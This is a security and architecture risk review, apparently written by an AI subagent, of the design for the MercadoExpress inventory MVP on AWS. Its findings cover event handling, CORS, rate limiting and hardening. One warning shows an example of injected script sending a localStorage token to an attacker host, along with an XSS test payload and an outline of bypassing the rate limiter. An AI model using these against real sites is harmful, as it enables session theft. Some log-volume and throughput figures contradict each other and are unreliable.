# Risk Review: `add-inventory-mvp` — MercadoExpress

- **Reviewer:** `review-risk` (subagent, fresh context)
- **Timestamp:** 2026-07-09
- **Change:** `add-inventory-mvp`
- **Scope:** `proposal.md` + 7 spec files + `design.md` (§1–§16)

## Severity scale

- **CRITICAL** — blocks `sdd-apply`. The change will not satisfy the spec or the
  proposal as written, OR a documented behaviour is unsafe.
- **WARNING** — should fix before `sdd-apply` (or `sdd-tasks` carries an explicit
  "FIXME before apply" into the work-unit).
- **SUGGESTION** — worth addressing when convenient; not blocking.
- **NIT** — cosmetic / cosmetic ordering.

---

## Findings — CRITICAL

### RISK-001 — In-process event bus does not work across separate Lambdas, breaks US-4 ("Recovery closes active alert")

- **File + section:** `design.md` §5.5 (`InProcessEventBus`), §6.3 (step 5–6 of
  the `StockMutationService` flow), §6.4 (`stock-mutation-service.ts` code
  sample), `specs/alerts/spec.md` §"Alert auto-closes on stock recovery".
- **What is wrong:**
  The `alerts` spec (`alerts/spec.md` lines 60–82) requires that when an
  adjustment via `POST /api/v1/products/{id}/movements` raises stock
  **strictly above** `stockMin`, the active `ACTIVA` alert transitions to
  `RESUELTA` _automatically_. The proposal labels this US-4 and BR-3 + RF-03.

  The design proposes an `InProcessEventBus` (§5.5) and tells the reader that
  "`alerts-lambda` subscribes in the same invocation (so subscribe/emit is
  local to one Lambda)". Then in §6.3 step 5 it emits
  `bus.emit('StockAdjusted', event)` _inside_ the inventory transaction, and
  in §6.4 the code carries an explicit `await this.bus.emit(...)` call but
  only handles the **open** path with direct `tx.alert.create` — there is no
  code (and no handler visible in §6.4) that closes an existing alert when
  `newStock > stockMin`.

  This contradicts itself and the stack:

  1. `InProcessEventBus` is a per-process class field (`handlers = new Map<...>()`).
     Two separate Lambda invocations = two processes = two bus instances. The
     event emitted by inventory-lambda is **invisible** to alerts-lambda.
  2. The receive path bypasses the bus correctly (it uses `AlertCloserPort`
     inside the same `$transaction`). The movement path _also_ needs a direct
     closer call, but no such call exists in §6.4 — only the in-process emit.
  3. Because there is no cross-Lambda transport (no EventBridge, no SQS, no SNS),
     the only place the recovery can be observed is inside the inventory
     transaction — and even there, §6.4 does not call
     `AlertCloserPort.txCloseIfOpenAndAboveMin(...)`.

  Net effect: any `POST /products/{id}/movements` with `ENTRADA` that recovers
  stock above `stockMin` will leave the active alert forever `ACTIVA` until a
  _separate_ `POST /orders/{id}/receive` happens to run. US-4 acceptance
  scenario "Recovery closes active alert" (manual ENTRADA path) **fails** in
  the implemented design.

- **Why it matters (impact):**
  This is a violation of an explicitly stated acceptance criterion
  (`specs/alerts/spec.md` lines 73–82). The end-user dashboard will show
  stale `ACTIVA` alerts after restocking, defeating the system's primary
  visibility value (RF-03). It also contradicts the design's own claim "we
  keep an in-process bus for the _create-side_ low-stock notification",
  because the bus is not a valid transport between separate Lambdas.
- **Concrete fix (in `sdd-apply` / `sdd-tasks`):**
  Replace the `bus.emit('StockAdjusted', event)` line in §6.4 with a direct
  call to `AlertCloserPort.txCloseIfOpenAndAboveMin(tx, { productId,
newStock, stockMin })` whenever `newStock > stockMin`, executing inside
  the **same** `prisma.$transaction` block (the ports already accept the
  active `tx`; the receive flow in §5.2 shows the contract). Either:
  - **Preferred:** make `inventory-lambda.application.stock-mutation-service.ts`
    also depend on `AlertCloserPort` (mirroring the receive flow), so the
    service calls both `txIncrementStock` and `txCloseIfOpenAndAboveMin` inside
    one transaction; OR
  - **Equivalent:** move the alert open/close logic into a `StockAlertRule`
    use case that the inventory adapter also calls, keeping the seam.

  In both cases, add a Vitest integration test
  "manual ENTRADA above stockMin closes active alert" that fires the
  movement, then asserts the `alerts.status` row is `RESUELTA` with
  `resolved_at` set. Keep one integration test
  ("movement failure rolls back alert close") that stubs the alert-close
  port to throw and asserts no movement is persisted.

  Either drop §5.5 / §6.3 step 5 from the narrative OR mark it explicitly
  as a v2 placeholder ("for the future EventBridge adapter; currently
  unused"). A bus that is half-implemented and ineffective is worse than
  no bus.

---

### RISK-002 — No CORS configuration on API Gateway; SPA on CloudFront makes cross-origin calls that the browser will block

- **File + section:** `design.md` §7.6 (line 1267–1293, `ofetch` setup),
  §15.1.1 (region + CloudFront), §15.4 (knobs table — no CORS row),
  `proposal.md` §3.4 (infrastructure stacks — no CORS row).
- **What is wrong:**
  - The SPA is served from `https://<random>.cloudfront.net` (§15.1,
    ADR-8). The API Gateway base URL is
    `https://<api-id>.execute-api.us-east-1.amazonaws.com` (§7.6, line
    1293). These are different origins.
  - The `onRequest` interceptor in `services/http.ts` sends `Authorization`
    and `X-Request-Id` headers on every fetch, making every request a
    "non-simple" CORS request that **must** be preceded by an OPTIONS
    preflight handled by API Gateway.
  - The design and proposal contain **zero** references to CORS
    configuration: no `corsPreflight: { allowOrigins: [...], allowHeaders:
[...], allowMethods: [...], allowCredentials: true }` in the HTTP API
    CDK construct, no allow-list of the CloudFront origin, no mention of
    how the OPTIONS preflight is authorised.
  - The frontend does not propose routing `/api/v1/*` through CloudFront
    to API Gateway (which would make the call same-origin), so CORS is
    the only path.
- **Why it matters (impact):**
  Every API call from the deployed SPA will be rejected by the browser
  with `No 'Access-Control-Allow-Origin' header is present on the
requested resource` and the auth token will never reach the backend.
  The MVP is broken end-to-end from the first request on the production
  domain. There is no way to discover this from spec review or backend
  unit tests; only the Playwright e2e against the deployed dev URL will
  catch it, at which point the apply work-unit must be re-opened.
- **Concrete fix:**
  In `packages/infra/src/stacks/ApiStack.ts`, configure the HTTP API v2 with:

  ```ts
  this.httpApi = new HttpApi(this, 'HttpApi', {
    corsPreflight: {
      allowOrigins: [`https://${distribution.distributionDomainName}`],
      allowMethods: [
        CorsHttpMethod.GET,
        CorsHttpMethod.POST,
        CorsHttpMethod.PATCH,
        CorsHttpMethod.OPTIONS,
      ],
      allowHeaders: ['Content-Type', 'Authorization', 'X-Request-Id', 'Idempotency-Key'],
      allowCredentials: false, // JWT is in headers, not cookies
      maxAge: Duration.hours(1),
    },
  });
  ```

  Add an explicit entry to §15.4 `Quick reference — knobs pinned by this
section` documenting the CORS origin (the CloudFront URL for MVP, the
  custom domain for v2). Add a Playwright e2e scenario "SPA on
  CloudFront reaches API Gateway" that asserts a real
  `OPTIONS /api/v1/products` from the SPA origin returns
  `Access-Control-Allow-Origin` matching the SPA origin.

---

### RISK-003 — In-memory rate limiter cannot satisfy D3 / auth spec in any environment that spawns more than one process

- **File + section:** `design.md` §3.1 (line 103 `in-memory-rate-limiter.ts`,
  "Redis swap-in is a follow-up"), §3.3 (lines 184–192 — `LoginUseCase`
  reads `rateLimiter.countFailures(...)`).
- **What is wrong:**
  - The login spec (`specs/auth/spec.md` line 130) requires the system
    MUST return `429` after 5 failures for the same `(ip, username)`
    pair within a 15-minute window. This is the orchestrator-locked D3
    commitment.
  - The rate limiter port is implemented by an `InMemoryRateLimiter`
    adapter. The state lives inside the Lambda process. AWS Lambda
    spawns one or more processes per concurrent invocation and **may
    evict any of them at any time** (15-min idle eviction is typical).
    Two concurrent login attempts (e.g. a user double-clicks while the
    network is slow) can hit two different processes and the counter
    is double-counted or under-counted depending on placement.
  - §15.2.1 sets prod reserved concurrency to "default (unset)"; in
    prod a real attack vector is trivial to bypass: open 5 parallel
    clients, each runs in its own process, each has `count = 0`,
    each is allowed 5 failures before trip, total = 25 failures before
    a 429 — the limit is meaningless.
  - ADR-3 (auth §3) does not mention this limitation. The design
    acknowledges "Redis swap-in is a follow-up" but does not flag the
    implication that D3 is **not satisfied** in MVP — i.e. the build
    ships with a known-broken failure-detection contract.
  - Even in dev (reserved concurrency = 1), the rate counter is lost
    whenever the single process is recycled (R-5 cold start scenario,
    which the proposal explicitly calls out).
- **Why it matters (impact):**
  The MVP's primary credential-stuffing defence (D3) is a paper check.
  An attacker with valid usernames from any of the seeded reference
  data (the admin username `admin` is published) can brute-force
  bcrypt cost-10 hashes indefinitely at HTTP latency, gated only by
  AWS account-level Lambda throttling and API Gateway HTTP API
  burst=100/steady=50. With bcrypt cost 10 (~80–100ms per check on
  a Lambda), a steady 50 rps * 100ms ≈ 5 bcrypt ops/sec/Lambda —
  sustainable, fast, and eventually effective against weak passwords.
- **Concrete fix:**
  In `sdd-apply`, before PR `feat/auth`: replace the in-memory
  adapter with one of:
  1. **`packages/backend/src/auth/infrastructure/postgres-rate-limiter.ts`** —
     a `login_attempts` table keyed on `(ip, username, ts)` with
     index on `(ip, username)` partial on `ts > now() - 15 min`,
     using Prisma; the port stays the same. ~50 lines, no new infra.
  2. **`packages/backend/src/auth/infrastructure/elasti-cache-redis-rate-limiter.ts`** —
     Redis with TTL on the key. Higher fidelity but paid (not free
     tier), so option 1 fits the budget.

  Either way, add to `specs/auth/spec.md` an acceptance scenario
  "Two parallel requests from the same IP share the counter" (two
  concurrent `POST /auth/login` calls with the wrong password each
  increment one shared counter; the 6th call sees `429`). Drop the
  "in-memory" tree leaf from §3.1 or label it explicitly
  `// INTENTIONAL PLACEHOLDER — replaced before apply`.

---

## Findings — WARNING

### Security

#### RISK-W01 — JWT stored in `localStorage` with no CSP / SRI / X-Frame-Options baselines in the design

- **File + section:** `design.md` §7.5 (line 1258 — `localStorage` under
  `mercadoexpress.auth`), §8 (frontend visual — no security headers
  section).
- **Why it matters:** Storing a 24h Bearer token in `localStorage` is the
  standard SPA pattern but is the dominant XSS exfiltration vector. With
  CloudFront serving the SPA, the design never mentions `Content-Security-Policy`,
  `X-Content-Type-Options: nosniff`, `Referrer-Policy`, `X-Frame-Options:
DENY` (or CSP `frame-ancestors 'none'`), or subresource integrity. Any
  injected script can `localStorage.getItem('mercadoexpress.auth')` and
  call `fetch('https://attacker/', { body: ... })` with the Bearer token.
  Clickjacking defences (`X-Frame-Options` / `frame-ancestors`) are
  recommended even on internal admin tools.
- **Concrete fix:** In §8 add a baseline `index.html` CSP and a
  CloudFront response-policy (or `s3` metadata) stub. Recommended CSP:
  `default-src 'self'; connect-src 'self' https://*.execute-api.us-east-1.amazonaws.com;
style-src 'self' 'unsafe-inline'; img-src 'self' data:; frame-ancestors 'none';
object-src 'none'; base-uri 'self'; form-action 'self'`. Add an
  adversarial scenario to e2e ("XSS payload in product name is rendered
  as text, not HTML") that fires a product name containing
  `<script>alert(1)</script>` and asserts the rendered DOM contains the
  literal text, not an executed script (Vue's default escaping covers
  this; the design should not even mention it without a test).

#### RISK-W02 — No dependency vulnerability scanning in CI

- **File + section:** `design.md` §11.1 (CI jobs), `proposal.md` §12
  (success criteria).
- **Why it matters:** `bcrypt`, `jose`, `prisma`, `@asteasolutions/zod-to-openapi`,
  `vue`, `vue-router`, `pinia`, `pino`, `ofetch` are all published
  packages; CVEs land regularly (e.g. `@prisma/client` has had multiple
  advisories, `jose` had `CVE-2024-XXXX` in the past). The CI matrix
  (§11.1) runs type-check, lint, vitest, playwright, cdk-synth. There is
  no `pnpm audit --prod`, no `osv-scanner`, no Snyk/Dependabot step.
  D7 (`jose` for JWT) and D6 (`bcrypt` cost 10) are security-critical
  choices; CVEs against either are silent failure modes.
- **Concrete fix:** Add to `.github/workflows/ci.yml` (and to §11.1):

  ```yaml
  - name: Vulnerability scan
    run: pnpm audit --prod --audit-level=high
  ```

  and optionally `osv-scanner --lockfile=pnpm-lock.yaml`. Document
  the policy in `AGENTS.md` ("no new high/critical vulnerability
  lands in a merged PR").

#### RISK-W03 — Authentication derives `ip` from `requestContext.http.sourceIp` with no documented X-Forwarded-For handling

- **File + section:** `design.md` §3.3 line 130 (`const ip = event.requestContext.http.sourceIp;`).
- **Why it matters:** Today API Gateway sits behind nothing (the SPA
  calls the API URL directly, per §7.6). When (if) CloudFront is put
  in front of API Gateway in v2 (a likely hardening move), the
  CloudFront edge IP becomes the `sourceIp` and the rate limiter no
  longer throttles per real client — it throttles per CloudFront
  edge, which fails open to all users behind the same edge.
- **Concrete fix:** Spec must say: "ip is taken from the XFF chain
  parsed and validated against `TRUSTED_PROXY_DEPTH` env, defaulting
  to `requestContext.http.sourceIp` when CloudFront is not in front".
  Add a unit test with a stubbed API Gateway event whose headers
  include `X-Forwarded-For: client, edge1, edge2` and assert the
  resolved IP. Without this, RISK-003 is even worse — a single edge
  accumulates the entire user base's failures.

#### RISK-W04 — ADMIN_PASSWORD has no documented rotation / recovery path

- **File + section:** `design.md` §10.2 (line 734 — `bcrypt.hash(ADMIN_PASSWORD, 10)`),
  `proposal.md` §16 (restated: "A forgotten password requires ops
  intervention (run the seed again with a new `ADMIN_PASSWORD`, or
  insert a bcrypt hash directly)").
- **Why it matters:** The design stores admin in SSM via env, the
  seed is the only bootstrap path, and on re-run the seed `upsert`s
  the password_hash on `username` (per §10.3). If `ADMIN_PASSWORD`
  is rotated, the next deploy silently changes the admin password —
  acceptable. But the only verification path is "log in with the new
  password" — the design never describes a rotation runbook,
  never schedules it, and never restricts who can read
  `ADMIN_PASSWORD` from Parameter Store. Sensitive-management is a
  §16 non-goal but a one-line runbook in §12 (or ADR) keeps ops
  honest. The current text gives no path at all.

#### RISK-W05 — Idempotency-Key storage location, eviction, and abuse controls are unspecified

- **File + section:** `specs/shared/spec.md` lines 162–189 (requirement),
  `design.md` §9.1 line 695 (middleware mention), §14.3
  (`packages/backend/src/shared/idempotency-key.ts` — file exists in
  §14.3 contract list but no design content).
- **Why it matters:** The header is honoured on five mutating
  endpoints, claimed stored for 24h, and "a retry with the same key
  and same body returns the original response without re-executing".
  The storage substrate is not stated: DB table? Redis? In-memory
  again? If DB, what schema, what eviction mechanism? If in-memory,
  the contract fails every cold start — silently. An attacker can
  flood the storage with random UUIDs (each request body bloat).
  Bound on keys per IP / per user is unspecified.
- **Concrete fix:** Add a short §9.1.a subsection: "Idempotency
  rows live in a `idempotency_keys` table
  `(key, user_id, request_hash, response_status, response_body,
 created_at)`; a Postgres scheduled job or a janitor Lambda deletes
  rows older than 24h; cap unique keys per user at 1000 with the
  1001st falling back to 'no idempotency' (logged) to prevent
  unbounded growth."

### Architecture

#### RISK-W06 — Direct invocation of "other BC's Prisma client" in receive flow is the wrong granularity for cross-Lambda consistency

- **File + section:** `design.md` §5 (especially §5.3 ports), §6.4
  (footnote "The same locking discipline is invoked when
  `orders-lambda` calls `ProductStockGate.txIncrementStock` inside
  the receive tx"), ADR-1.
- **Why it matters:** The design's chosen mechanism (`orders-lambda`
  owns the `$transaction` and calls `txIncrementStock` /
  `txCloseIfOpenAndAboveMin` from `inventory` / `alerts`
  infrastructure) is sound for a single-Lambda MVP. The contract
  is also defensible because each port accepts the `tx` handle and
  performs a single SQL statement inside it. But the design promises
  on §14.3 / §6 that "the only public write path on the
  repositories used by `orders`" is via these ports, and there is no
  architectural test or lint rule that prevents a future PR from
  importing `PrismaClient.alert.create()` directly in `orders`. The
  cross-BC seam is enforced by convention.
- **Concrete fix:** Add a Vitest architectural test in
  `packages/backend/test/architecture/cross-bc-bounds.test.ts`:
  read every `import` statement under `packages/backend/src/orders/**/*.ts`
  and fail the build on any import path containing `infrastructure/`
  of another BC. ADR-1 promises the rule; the test makes it
  enforceable.

#### RISK-W07 — Receive flow's four-step orchestration is unprotected against re-ordering or duplicate calls

- **File + section:** `design.md` §5.2 (text diagram), § ADR-3,
  `specs/orders/spec.md` "Receive transitions APROBADA to RECIBIDA".
- **Why it matters:** A `POST /api/v1/orders/{id}/receive` retried by
  the SPA (e.g. due to a 200 response that the browser thinks is a
  failure because the connection dropped before the body arrived)
  reaches the orders-lambda again. The second call sees the order
  in `status = "RECIBIDA"` and §5.2 step 1 hits
  `ORDER_INVALID_TRANSITION` → `409`. So duplicate receive is
  blocked at the state machine, which is good. But because the
  design says "the four writes are coupled by order", a _partial_
  outcome in step 1 succeeds (status flip) before step 2 begins —
  if step 2 / 3 / 4 then dies (e.g. transient DB error), the
  transaction rolls back as a whole and is correct. Good.

  However, the Idempotency-Key middleware (§9.1) sits in front of
  the handler, not after the transaction. If the call succeeds but
  the response is lost, the Idempotency-Key lookup returns the
  original response on retry — but only if the same Idempotency-Key
  is sent. The SPA does not consistently send it. The defensive
  design would include a per-order idempotency token in the URL
  itself (`/orders/{id}/receive?token=<uuid>` issued at approve
  time) or rely on the state machine alone (which is what the spec
  already does — good).

- **Concrete fix:** None required; the state machine guard is
  sufficient. But document explicitly in the design: "duplicate
  `POST /receive` is blocked by the state machine, not by
  Idempotency-Key". One sentence in ADR-3.

#### RISK-W08 — StockMovement rows record `user_id` from JWT `sub` but never verify `sub == users.id` at the DB layer

- **File + section:** `design.md` §4.4 (line 357: `user_id UUID NOT NULL REFERENCES users(id) ON DELETE RESTRICT`).
- **Why it matters:** The FK protects against orphaned users, not
  against a forged JWT. If a malformed token makes it through (e.g.
  validation bypass), `sub` could be any UUID. The current trust
  model is "JWT middleware verified → trust everything in claims".
  That is standard; fine. But the design should mention a per-Lambda
  invariant test asserting every `sub` claim that lands in
  `StockMovement.user_id` corresponds to a real user row at write
  time (cheap check, eliminates zombie user IDs). A future
  bug-bounty will catch it if not tested.

### Dependencies

#### RISK-W09 — `bcrypt` is imported into a Lambda that already loads Prisma + the pgvector native binding; cold-start cost not sized

- **File + section:** `design.md` §1 (5 Lambdas with Prisma + pgvector),
  §3.5 (`bcrypt-password-hasher.ts`), §14.1 (file-count section).
- **Why it matters:** `bcrypt` has a native binding; the Lambda bundle
  size plus the cold-start pathological case (Prisma engine +
  pgvector native + bcrypt native) is R-1 in the proposal. The
  mitigation is "minify Prisma client bundle; provisioned
  concurrency = 0 for free tier". No number is given. With 5
  Lambdas at 1 GB each, the cold-start can hit Lambda's 10 s
  timeout if any one of the three natives fails to link. In dev
  (reserved = 1), a cold-start costs the operator 3 s per page
  load once per day. The design estimates "1-3 s" but no target is
  set; the success criterion "first API call after 30 minutes idle
  < 3 s p95" is untested.
- **Concrete fix:** Add a `k6` smoke (already proposed in §12.5) that
  measures cold-start p95 after a 30-min idle and asserts the
  threshold. If it fails the apply work-unit reopens. No design
  change required; the gap is in verify.

### Free-tier sustainability

#### RISK-W10 — CloudWatch retention of 7 days is below AWS free-tier 5 GB ingestion; long-term prod will tip out of free tier

- **File + section:** `design.md` ADR-7 (line 935),
  `proposal.md` R-1 mitigation.
- **Why it matters:** Free-tier covers 5 GB of log ingestion for
  ingestion, and 5 GB of log storage for archival. At 5 Lambdas
  with `info`-level logs carrying `requestId + userId + bc + route
  - latencyMs + outcome`, sustained traffic at 50 rps × 12 h/day =
    2.16 M log lines × ~400 bytes ≈ 850 MB/day = 6 GB in 7 days —
    already double the free-tier storage. The proposal claims "dev
    stage only" but does not size the budget.
- **Concrete fix:** Document the expected log volume per day (rough
  bytes-per-line × expected rps × hours) and pick a retention that
  keeps `5 Lambdas × days × daily_bytes ≤ 5 GB`. At
  ~250 lines/min sustained, that is roughly 30 MB/day → 200 days
  retention in 5 GB. 7 days is conservative; if the design is
  "dev only", 7 days may be excessive budget. Otherwise, set
  retention lower (1 day for `info`-only logs, archive `error`
  elsewhere). The current setting is fine but should be sized,
  not assumed.

#### RISK-W11 — Prod reserved concurrency is unset; RDS connection ceiling not enforced

- **File + section:** `design.md` §15.2 ADR-9 (prod reserved =
  default).
- **Why it matters:** With 5 Lambdas at unreserved concurrency and
  Prisma's default connection pool (typically 5 per process), a
  burst can open `5 Lambdas × 2 processes × 5 connections = 50
connections` against `db.t3.micro`. RDS `db.t3.micro` defaults
  cap at ~100 connections; that is OK but no headroom. The proposal
  R-4 mentions RDS Proxy as mitigation but RDS Proxy is NOT
  free-tier. The design drops the mitigation silently.
- **Concrete fix:** Either set a low per-Lambda reserved concurrency
  in prod (e.g. 10) and document the connection budget
  (`5 * 10 * Prisma limit`), OR add a Prisma `connection_limit
= 2` argument at the PrismaClient construction and pin total
  connections under 20. ADR-9 should mention this trade-off.

---

## Findings — SUGGESTION + NIT

### SUGGESTION

- **RISK-S01** — `design.md` lists the rate-limiter port as
  "fail-open on Lambda container cold start". Make this explicit in
  the spec: "On cold start, the rate limiter starts with `count = 0`;
  the 5-failure window starts at the first failure after cold start".
  Today it is implied but unstated, and `specs/auth/spec.md` could
  be read as "the window starts at the first attempt ever".
- **RISK-S02** — The product update endpoint
  (`PATCH /api/v1/products/{id}`) accepts `categoryId`. If a
  category is renamed or removed, the `CategoryName` VO
  (`categories/spec.md` §"Domain primitives") is a 2-40 char
  unique string — acceptable. But the design never specifies the
  `errorsWhen NoUpdateNeeded` if the same body is sent twice — that
  is a no-op return 200 by convention. Add a Vitest unit test
  ("PATCH with same body returns same product") for symmetry.
- **RISK-S03** — `design.md` §6.3 step 5 emits the event _inside_
  the transaction. Even if RISK-001 is fixed (replace with
  `AlertCloserPort`), the `await bus.emit(...)` line should
  vanish from the transaction body to keep the tx short; cloud DB
  transactions holding row locks = R-2 amplification.
- **RISK-S04** — `packages/backend/src/shared/jwt-middleware.ts` is
  contract-locked but never detailed in the design. The dual-secret
  rotation window spec (`specs/auth/spec.md` §165–183) lists three
  scenarios; the design should sketch the validation order
  (try `JWT_SECRET` first, fall back to `JWT_SECRET_PREVIOUS`,
  measure latency added per call, document the per-request cost).
- **RISK-S05** — `proposal.md` §10.4 calls for "feature flag at
  Lambda env" with `ALERT_AUTOCREATE`. The design never describes
  how the flag is read (one const per Lambda? a `FeatureFlags`
  service?). Without that detail, the rollback plan is half-built.
- **RISK-S06** — The frontend `services/http.ts` interceptor
  generates a new `crypto.randomUUID()` for every request as the
  `X-Request-Id`. This means backend logs cannot stitch a single
  user action across requests (e.g. click → POST → reload → GET).
  Use a stable per-tab UUID (Pinia `useAuthStore` already has the
  user identity) and reuse it across the tab's lifetime.
- **RISK-S07** — `uid` of the Idempotency-Key request body is
  hashed for body comparison. The design never specifies the
  hashing algorithm. Recommend SHA-256 of the JSON-encoded,
  key-sorted body to avoid false-positive `IDEMPOTENCY_KEY_CONFLICT`.

### NIT

- **RISK-N01** — Section ordering oddity: `design.md` lines
  1018–1559 (§7 frontend architecture, §8 frontend visual) appear
  **between** §14 (line 957) and §15 (line 1562). The numbers are
  correct but reading top-to-bottom jumps from backend to frontend
  to backend to frontend before hitting §15. This will trip up
  apply-phase agents that slice the file by section. **Fix at the
  start of `sdd-apply`** by moving §7 + §8 to between §6 and §9
  (or, less invasive, leaving as-is and adding a
  `<!-- sections-deliberately-appended -->` marker in a known
  location that apply agents can detect). Note: this also breaks
  any automated doc-link from §16 to §15 if a tooling agent
  indexes by file order rather than heading. Recommend fix.
- **RISK-N02** — `design.md` §3.5 file path uses `// from SSM:
JWT_SECRET` as a comment. Good practice.
- **RISK-N03** — `proposal.md` §7.1 says the dual-secret window is
  `3600`s; `specs/auth/spec.md` §"Dual-secret rotation" repeats
  `default 3600`. `design.md` does not restate this in §ADR. Worth
  one line in §13 for traceability.
- **RISK-N04** — `design.md` §7.5 layout renders Pinia stores in a
  table; the `useInventoryStore` row says `fetchMovements(productId)` —
  singular; but `inventory/store` could be replayed across
  products. Fine, but adding `movementsByProduct: Map<string, Movement[]>`
  is a useful abstraction the design already hints at.
- **RISK-N05** — Cosmetic: `design.md` uses ASCII arrows in code
  samples (`→`) but monospace arrows in others (`->`). Consistent
  with English-only comment rule; not a bug.

---

## Cross-check tables

### Locked decisions honored?

| Locked decision                                               | Honored?                                      | Evidence pointer                                                                                                                                                                                  |
| ------------------------------------------------------------- | --------------------------------------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| D1 — StockMovement is its own aggregate root                  | YES                                           | `design.md` §4.4 (`stock_movements` table with no inbound FK); §4.7 (note "D1 invariant note (IN-1)"). Spec: `inventory/spec.md` §"StockMovement is its own aggregate root (no FK from outside)". |
| D2 — `Categoria` lookup table FK                              | YES                                           | `design.md` §4.2 `categories` table; §4.3 `category_id UUID NOT NULL REFERENCES categories(id)`. Spec: `categories/spec.md` §"Purpose".                                                           |
| D3 — Login rate limit 5/15 min per IP+username, failures only | YES (in spec), NO (in adapter — see RISK-003) | `specs/auth/spec.md` §165–183; `design.md` §3.3 + §3.1 in-memory adapter.                                                                                                                         |
| D4 — COP integer currency                                     | YES                                           | `design.md` §1, §7.3; `specs/shared/spec.md` §"Money value object (COP integer)"; §4.3 `price DECIMAL(12, 0)`.                                                                                    |
| D5 — prisma db seed via CI Lambda, idempotent                 | YES                                           | `design.md` §10.1–10.4; `specs/shared/spec.md` §"Reference-data bootstrap".                                                                                                                       |
| D6 — bcrypt cost 10                                           | YES                                           | `design.md` §10.2 `bcrypt.hash(ADMIN_PASSWORD, 10)`; `specs/auth/spec.md` §"bcrypt cost 10".                                                                                                      |
| D7 — `jose` for JWT                                           | YES                                           | `design.md` §3.5 (`jose` import); `specs/auth/spec.md` §"Login issues an HS256 JWT".                                                                                                              |
| Q-P1 — Single-form order creation                             | YES                                           | `design.md` §7.3 (line 1109 "`OrderCreatePage.vue` SINGLE FORM (Q-P1)"); `orders/spec.md` §"Frontend contract note".                                                                              |
| Q-P2 — Paginated latest 50 stock history                      | YES                                           | `design.md` §7.3 line 1106; `specs/inventory/spec.md` §"Paginated movement history (latest 50 by default)".                                                                                       |
| Q-P3 — Supplier snapshot                                      | YES                                           | `design.md` §4.6 `supplier_snapshot TEXT NOT NULL`; `specs/orders/spec.md` §"Supplier snapshot is immutable after creation".                                                                      |
| Q-P4 — Login rate limit failures only                         | YES                                           | `design.md` §3.3 comment "failures only"; `specs/auth/spec.md` §"Login rate-limits on 5 failures per 15 minutes" scenario "Successful login does NOT count".                                      |

### Spec coverage of BR-1..BR-6 + BR-D1..BR-D9

| Rule                                 | Spec file + requirement                                                                                                            | Design test strategy                                                                               |
| ------------------------------------ | ---------------------------------------------------------------------------------------------------------------------------------- | -------------------------------------------------------------------------------------------------- |
| BR-1 (no negative stock)             | `specs/inventory/spec.md` §"SALIDA below zero is rejected with STOCK_WOULD_GO_NEGATIVE"                                            | `design.md` §6.3 step 2 + ADR-2; Vitest integration test "SALIDA that would go negative rejected"  |
| BR-2 (quantity ≥ 2 × stockMin)       | `specs/orders/spec.md` §"Quantity must satisfy 2 * stockMin policy"                                                                | ADR-1 (none specific); spec scenario covers                                                        |
| BR-3 (receive closes alert)          | `specs/orders/spec.md` §"Receive transitions APROBADA to RECIBIDA" + `specs/alerts/spec.md` §"Alert auto-closes on stock recovery" | `design.md` §5.2 + ADR-1 + ADR-3; Vitest integration test "receive rolls back on movement failure" |
| BR-4 (one ACTIVA per product)        | `specs/alerts/spec.md` §"At most one ACTIVA alert per productId (DB invariant)"                                                    | `design.md` §4.5 partial unique index; §6.3 step 6 catch unique_violation                          |
| BR-5 (state machine)                 | `specs/orders/spec.md` §"Order status follows the state machine"                                                                   | `design.md` §ADR-3 (implicit), §6 step order                                                       |
| BR-6 (append-only movement)          | `specs/inventory/spec.md` §"StockMovement rows are append-only"                                                                    | `design.md` §4.4 + `inventory/spec.md` §"Repository interface"                                     |
| BR-D1 (approve: PENDIENTE→APROBADA)  | `specs/orders/spec.md` §"Approve transitions PENDIENTE to APROBADA"                                                                | `design.md` implicit; no dedicated test (gap — SUGGESTION)                                         |
| BR-D2 (reject: ≥10 chars, PENDIENTE) | `specs/orders/spec.md` §"Reject transitions PENDIENTE to RECHAZADA with reason"                                                    | `design.md` implicit; no dedicated test (gap — SUGGESTION)                                         |
| BR-D3 (receive: APROBADA→RECIBIDA)   | `specs/orders/spec.md` §"Receive transitions APROBADA to RECIBIDA"                                                                 | `design.md` ADR-3 step 1                                                                           |
| BR-D4 (atomic receive)               | `specs/orders/spec.md` §"Receive (atomic side-effects)"                                                                            | `design.md` §5.2 + ADR-3 + integration test                                                        |
| BR-D5 (SKU unique)                   | `specs/products/spec.md` §"Duplicate SKU returns 409"                                                                              | `design.md` §4.3 implicit UNIQUE constraint; scenario covers race                                  |
| BR-D6 (no silent upsert)             | `specs/products/spec.md` §"Duplicate SKU returns 409"                                                                              | Same as BR-D5 (constraint enforces 409)                                                            |
| BR-D7 (quantity > 0)                 | `specs/inventory/spec.md` §"quantity = 0 rejected"                                                                                 | `design.md` §4.4 `CHECK (quantity > 0)`                                                            |
| BR-D8 (sign from MovementType)       | `specs/inventory/spec.md` §"Sign of stock delta derives from MovementType"                                                         | `design.md` §6.3 step 2                                                                            |
| BR-D9 (defence in depth)             | (no dedicated spec file)                                                                                                           | `design.md` §3.6 + `eslint-plugin-boundaries`. NO dedicated test (gap)                             |

**Coverage gap:** BR-D1, BR-D2, and BR-D9 each lack a named integration
test in `design.md`. The spec scenarios cover them at the requirement
level but the design's test strategy does not commit to a Vitest
integration test for each. BR-D9 ("defence in depth") is the loosest —
no single test can prove it; the right artefact is an architectural
test (see RISK-W06 for the proposed pattern).

### Free-tier sustainability check

| AWS service                      | Usage                                                                                                                                   | Free-tier budget headroom                                                                                                                                                                        |
| -------------------------------- | --------------------------------------------------------------------------------------------------------------------------------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ |
| RDS Postgres `db.t3.micro`       | 5 Lambdas × 2 warm processes × 1 connection each = 10 conns (dev reserved=1 → 5 conns). Storage grows with seed (~7 rows total in MVP). | **OK in MVP.** Free-tier 750 h/month × 12 months.                                                                                                                                                |
| Lambda invocations (5 functions) | dev reserved=1 → at most 5 concurrent. Cold-start pathological in 15-min idle window (R-1).                                             | **OK.** Free-tier 1 M invocations/month + 400,000 GB-seconds. With <1000 ops/day the budget lasts months.                                                                                        |
| API Gateway HTTP API v2          | dev only; throttling 100/50; manual operator traffic.                                                                                   | **OK.** Free-tier 1 M API calls/month × 12 months.                                                                                                                                               |
| S3 static hosting                | ~1 MB SPA bundle.                                                                                                                       | **OK.** Free-tier 5 GB storage × 12 months + 20,000 GET/2,000 PUT.                                                                                                                               |
| CloudFront                       | SPA caching only, default cert, default URL.                                                                                            | **OK.** Free-tier 1 TB egress/month × 12 months.                                                                                                                                                 |
